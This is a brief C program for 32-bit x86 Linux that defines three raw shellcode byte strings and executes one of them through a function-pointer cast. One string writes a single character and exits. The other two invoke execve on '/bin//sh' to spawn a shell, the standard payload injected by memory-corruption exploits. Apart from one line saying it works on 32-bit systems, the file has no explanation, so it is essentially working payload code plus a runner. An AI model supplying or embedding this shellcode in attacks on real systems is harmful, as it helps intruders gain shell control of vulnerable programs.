/*
 * Works on 32 bit systems.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

static char *shellcode_write = \
"\x31\xdb\x31\xd2\x31\xc0\x6a\x41\xfe\xc3"
"\x89\xe1\xfe\xc2\xb0\x04\xcd\x80\x31\xdb"
"\xb0\x01\xcd\x80";

static char *shellcode_exec = \
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
"\x80";

static char *shellcode_exec_sh = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";

int main(void)
{
	printf("shellcode length: %zu\n", strlen(shellcode_exec));
	(*(void (*)()) shellcode_exec)();

	return 0;
}